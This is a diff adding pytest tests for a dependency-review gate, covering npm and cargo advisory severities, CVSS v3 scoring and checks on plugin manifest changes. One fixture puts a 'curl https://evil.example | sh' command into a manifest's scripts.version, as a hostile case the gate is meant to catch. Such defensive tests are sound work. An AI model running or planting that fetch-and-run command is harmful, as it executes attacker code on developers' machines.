@@ -1185,3 +1185,353 @@ def test_lock_refuses_a_tree_entry_that_climbs_out(tmp_path: Path, monkeypatch: 
     _git(tmp_path, "tag", "rea-agents-6.7.0", commit)
     with pytest.raises(ConfigError, match="must not see"):
         review.lock(review.parse_config(MONOREPO), "rea-agents-6.7.0", _never_runs)
+
+
+# ---- what holds a sync (ADR-0056 amendment 4) -----------------------------------------------
+
+
+def _npm_one_report(severity: str, score: Any) -> tuple[bytes, bytes]:
+    via: dict[str, Any] = {
+        "source": 1,
+        "url": "https://x/GHSA-1",
+        "title": "t",
+        "severity": severity,
+    }
+    if score != "no CVSS":
+        via["cvss"] = {"score": score, "vectorString": None}
+    report = {
+        "vulnerabilities": {"dep": {"name": "dep", "via": [via], "nodes": ["node_modules/dep"]}}
+    }
+    lock = _npm_lock(**{"node_modules/dep": _registry("dep", "1.0.0")})
+    return json.dumps(report).encode(), lock
+
+
+def _one_npm_advisory(severity: str, score: Any, code: int = 1) -> Finding:
+    report, lock = _npm_one_report(severity, score)
+    [finding] = review.advisory_findings("npm", code, report, lock, "lock")
+    return finding
+
+
+@pytest.mark.parametrize("code", [0, 1])
+def test_a_moderate_npm_advisory_with_a_critical_score_holds(code: int) -> None:
+    """npm passes `--audit-level=high` with only a moderate advisory, so the passing audit is read
+    too; the advisory is fingerprinted as any other."""
+    finding = _one_npm_advisory("moderate", 9.1, code)
+    assert finding.holds and finding.summary.startswith("GHSA-1 dep 1.0.0")
+    assert finding.fingerprint() == _one_npm_advisory("high", 9.1).fingerprint()
+
+
+def test_a_moderate_npm_advisory_below_a_critical_score_is_still_dropped() -> None:
+    report, lock = _npm_one_report("moderate", 6.0)
+    assert review.advisory_findings("npm", 0, report, lock, "lock") == []
+    with pytest.raises(ReviewUnavailable, match="listed no advisory"):
+        review.advisory_findings("npm", 1, report, lock, "lock")
+
+
+def test_a_passing_npm_audit_whose_output_does_not_parse_lists_nothing() -> None:
+    assert review.advisory_findings("npm", 0, b"", NPM_LOCK, "lock") == []
+
+
+@pytest.mark.parametrize(
+    ("severity", "score", "holds"),
+    [
+        ("critical", 9.8, True),
+        ("critical", "no CVSS", True),
+        ("high", 9.8, True),
+        ("high", 9.0, True),
+        ("high", 8.9, False),
+        ("high", 7.5, False),
+        ("high", "no CVSS", False),
+        ("high", None, False),
+    ],
+)
+def test_only_a_critical_advisory_holds(severity: str, score: Any, holds: bool) -> None:
+    """npm's `critical`, or a given base score of 9.0 or more; every other advisory is reported."""
+    finding = _one_npm_advisory(severity, score)
+    assert finding.holds is holds
+    assert Report("h", [finding]).exit_code({}) == (1 if holds else 0)
+
+
+def test_advisory_holding_keeps_every_fingerprint() -> None:
+    """The fingerprints the gate printed before amendment 4, pinned: every acknowledgement already
+    written still names the same advisory."""
+    cargo = review.advisory_findings("cargo", 1, CARGO_REPORT, b"", "Cargo.lock")
+    assert [f.fingerprint() for f in cargo] == [
+        "991391143f55e75b",
+        "d138222d35fdd03e",
+        "2753ba86440f7041",
+        "a672b1a79b93bbb3",
+        "8a2de51901b26f4f",
+        "754452fc19a56406",
+        "fcdfe8358d3f49fd",
+    ]
+    npm = review.advisory_findings("npm", 1, NPM_REPORT, NPM_LOCK, "package-lock.json")
+    [minimist] = [f for f in npm if f.holds]
+    assert minimist.summary.startswith("GHSA-xvch-5gv4-984h minimist 1.2.5")
+    assert minimist.fingerprint() == "007871cecc4ed8f8"
+    assert len(npm) == 10
+
+
+def test_an_install_script_is_reported_and_the_other_lock_findings_hold() -> None:
+    old = _npm_lock(**{"node_modules/retagged": _registry("retagged", "2.0.0", "sha512-old")})
+    new = _npm_lock(
+        **{
+            "node_modules/retagged": _registry("retagged", "2.0.0", "sha512-new"),
+            "node_modules/hooky": _registry("hooky", "3.0.0", hasInstallScript=True),
+        }
+    )
+    findings = review.npm_lock_review(_change("package-lock.json"), old, new).findings
+    assert {(f.kind, f.holds) for f in findings} == {
+        ("npm-install-script", False),
+        ("npm-lock-integrity", True),
+    }
+    [script] = [f for f in findings if not f.holds]
+    assert Report("h", [script]).exit_code({}) == 0
+
+
+@pytest.mark.parametrize(
+    ("severity", "holds"), [("low", False), ("LOW", False), ("medium", True), ("high", True)]
+)
+def test_a_low_model_finding_is_reported(severity: str, holds: bool) -> None:
+    verdict = {"findings": [{"severity": severity, "path": "a", "summary": "s"}]}
+    config = review.parse_config(CARGO)
+    [finding] = review.ai_findings(
+        config, "diff", {"a": "blob"}, "key", _model(json.dumps(verdict), [])
+    )
+    assert finding.holds is holds
+    assert Report("h", [finding]).exit_code({}) == (1 if holds else 0)
+
+
+def test_an_unranked_model_severity_holds() -> None:
+    verdict = {"findings": [{"severity": "Critical", "path": "a", "summary": "s"}]}
+    config = review.parse_config(CARGO)
+    [finding] = review.ai_findings(config, "diff", {}, "key", _model(json.dumps(verdict), []))
+    assert (finding.severity, finding.holds) == ("high", True)
+
+
+MANIFEST = {
+    "name": "p",
+    "version": "1.0.0",
+    "metadata": {"version": "2.0.0"},
+    "plugins": [{"name": "x", "version": "0.1.0"}],
+    "scripts": {"version": "1.0.0", "build": "tsc"},
+    "dependencies": {"version": "1.0.0"},
+    "overrides": {"dep": {"version": "1.0.0"}},
+}
+WATCHED = CARGO.replace('".claude/*"', '".claude-plugin/*"')
+
+
+def _watched(path: str, old: Any, new: Any) -> Finding:
+    def side(value: Any) -> bytes | None:
+        if value is None or isinstance(value, bytes):
+            return value
+        return json.dumps(value).encode()
+
+    blobs = {"o1": side(old), "n1": side(new)}
+    status = "A" if old is None else "M"
+    change = _change(path, status)
+    [finding] = review.path_findings(review.parse_config(WATCHED), [change], blobs.get)
+    assert finding.kind == "watched-path"
+    return finding
+
+
+def _bumped(**changes: Any) -> dict[str, Any]:
+    return {**MANIFEST, "version": "1.1.0", **changes}
+
+
+@pytest.mark.parametrize(
+    "new",
+    [
+        _bumped(),
+        {**MANIFEST, "plugins": [{"name": "x", "version": "0.2.0"}]},
+        _bumped(plugins=[{"name": "x", "version": "0.9.0"}]),
+        {**_bumped(), "metadata": {"version": "2.0.0-rc.1+build.5"}},
+    ],
+)
+def test_a_watched_manifest_whose_only_change_is_versions_is_reported(new: Any) -> None:
+    finding = _watched(".claude-plugin/plugin.json", MANIFEST, new)
+    assert not finding.holds and "only `version`" in finding.summary
+    # Its fingerprint is the watched path's as ever: the content, not whether it holds.
+    held = _watched(".claude-plugin/plugin.json", MANIFEST, _bumped(mcpServers={}))
+    assert finding.fingerprint() == held.fingerprint()
+
+
+@pytest.mark.parametrize(
+    ("path", "old", "new"),
+    [
+        # An unpinned MCP server beside the bump: the census's one finding that led to action.
+        (
+            ".claude-plugin/plugin.json",
+            MANIFEST,
+            _bumped(mcpServers={"x": {"command": "npx", "args": ["x"]}}),
+        ),
+        (".claude-plugin/plugin.json", MANIFEST, _bumped(name="q")),
+        (".claude-plugin/plugin.json", MANIFEST, {"name": "p", "plugins": MANIFEST["plugins"]}),
+        (".claude-plugin/plugin.json", MANIFEST, _bumped(version={"from": "npx evil"})),
+        (".claude-plugin/plugin.json", MANIFEST, b'{"name": "p", "version": "1.1.0",'),
+        (".claude-plugin/plugin.json", b"not json", _bumped()),
+        (
+            ".claude-plugin/plugin.json",
+            MANIFEST,
+            # Read last-wins, this is a version bump; another reader takes `evil`.
+            json.dumps({**_bumped(), "name": "evil"}).encode()[:-1] + b', "name": "p"}',
+        ),
+        (".claude-plugin/plugin.json", None, MANIFEST),
+        # npm runs `scripts.version` on `npm version`; it is a script, not the release.
+        (
+            ".claude-plugin/plugin.json",
+            MANIFEST,
+            _bumped(scripts={"version": "curl https://evil.example | sh", "build": "tsc"}),
+        ),
+        (
+            ".claude-plugin/plugin.json",
+            MANIFEST,
+            _bumped(scripts={"version": "1.0.1", "build": "tsc"}),
+        ),
+        (".claude-plugin/plugin.json", MANIFEST, _bumped(dependencies={"version": "2.0.0"})),
+        (".claude-plugin/plugin.json", MANIFEST, {**MANIFEST, "version": "^1.1.0"}),
+        (".claude-plugin/plugin.json", MANIFEST, {**MANIFEST, "version": "https://x/p-1.1.0.tgz"}),
+        (".claude-plugin/plugin.json", MANIFEST, {**MANIFEST, "version": "1.1.0 "}),
+        (".claude-plugin/plugin.json", {**MANIFEST, "version": "^1.0.0"}, _bumped()),
+        (".claude-plugin/plugin.json", MANIFEST, _bumped(overrides={"dep": {"version": "1.0.1"}})),
+        (".claude-plugin/plugin.js", MANIFEST, _bumped()),
+    ],
+    ids=[
+        "adds-mcpServers",
+        "other-value",
+        "version-key-removed",
+        "version-not-a-string",
+        "head-not-json",
+        "base-not-json",
+        "duplicate-keys",
+        "added",
+        "scripts-version-command",
+        "scripts-version-semver",
+        "dependency-named-version",
+        "semver-to-range",
+        "semver-to-url",
+        "trailing-space",
+        "range-to-semver",
+        "nested-below-a-guarded-key",
+        "not-a-json-file",
+    ],
+)
+def test_any_other_watched_change_holds(path: str, old: Any, new: Any) -> None:
+    assert _watched(path, old, new).holds
+
+
+def test_reported_findings_are_marked_and_fail_nothing() -> None:
+    reported = Finding("ai", "a", "a small concern", "blob", "low", holds=False)
+    held = Finding("binary", "b.node", "s", "c1")
+    report = Report("h", [reported, held])
+    assert report.failing({}) == [held] and report.exit_code({}) == 1
+    markdown = report.markdown({})
+    assert "| reported | ai (low) |" in markdown and "| **fails** | binary" in markdown
+    assert markdown.count("fail nothing and need no acknowledgement") == 1
+    # An acknowledgement of a reported finding is harmless and the row stays reported.
+    acks = {reported.fingerprint(): Ack("devon", "d", "read", "low")}
+    assert report.failing(acks) == [held] and "| reported | ai (low) |" in report.markdown(acks)
+    assert "fail nothing" not in Report("h", [held]).markdown({})
+
+
+@pytest.mark.parametrize(
+    ("vector", "score"),
+    [
+        # Published scores (FIRST's calculator).
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8),
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", 10.0),
+        ("CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", 7.8),
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1),
+        ("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9),
+        ("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8),
+        # Privileges Required weighs 0.68, not 0.62, once the scope changes.
+        ("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", 6.4),
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N", 0.0),
+        # The metrics in any order.
+        ("CVSS:3.1/A:H/I:H/C:H/S:U/UI:N/PR:N/AC:L/AV:N", 9.8),
+        # Temporal and environmental metrics play no part in the base score.
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C", 9.8),
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/CR:H/MAV:L/MS:C/MC:N/MI:X/MA:L", 9.8),
+    ],
+)
+def test_cvss_base_scores(vector: str, score: float) -> None:
+    assert review.cvss_base_score(vector) == score
+
+
+@pytest.mark.parametrize(
+    "vector",
+    [
+        "",
+        "no CVSS",
+        "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
+        "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/A:H",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/AV:L",
+        "CVSS:3.1/AV:X/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/XX:F",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/E:H",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:Z",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/",
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/AH",
+        "CVSS:3.1/av:n/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "CVSS:3.1",
+        # A well-formed v3 base body under any other version is not scored.
+        "CVSS:4.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "CVSS:3.2/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "CVSS:2.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    ],
+    ids=[
+        "empty",
+        "no-cvss",
+        "no-prefix",
+        "v2",
+        "v4",
+        "metric-missing",
+        "duplicate-metric",
+        "duplicate-with-other-value",
+        "unknown-value",
+        "unknown-metric-name",
+        "duplicate-temporal-metric",
+        "unknown-temporal-value",
+        "trailing-slash",
+        "no-colon",
+        "lower-case",
+        "prefix-only",
+        "v4-prefix-v3-body",
+        "v3.2-prefix",
+        "v2-prefix-v3-body",
+        "lower-case-prefix",
+    ],
+)
+def test_a_vector_that_is_not_a_strict_v3_base_vector_is_not_scored(vector: str) -> None:
+    assert review.cvss_base_score(vector) is None
+
+
+def test_the_roundups_round_up_and_v31_ignores_floating_point_error() -> None:
+    assert review._roundup_v31(4.02) == review._roundup_v30(4.02) == 4.1
+    assert review._roundup_v31(4.000000000000001) == 4.0  # v3.0's ceil reads this as 4.1
+    assert review._roundup_v30(4.0) == review._roundup_v31(4.0) == 4.0
+
+
+@pytest.mark.parametrize(
+    ("vector", "holds"),
+    [
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", True),
+        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", True),
+        ("CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", False),
+        ("CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N", False),
+        (None, False),
+    ],
+)
+def test_a_cargo_advisory_holds_when_its_vector_scores_critical(
+    vector: str | None, holds: bool
+) -> None:
+    report = json.loads(CARGO_REPORT)
+    report["vulnerabilities"]["list"] = report["vulnerabilities"]["list"][:1]
+    report["vulnerabilities"]["list"][0]["advisory"]["cvss"] = vector
+    [finding] = review.advisory_findings("cargo", 1, json.dumps(report).encode(), b"", "Cargo.lock")
+    assert finding.holds is holds
+    assert Report("h", [finding]).exit_code({}) == (1 if holds else 0)
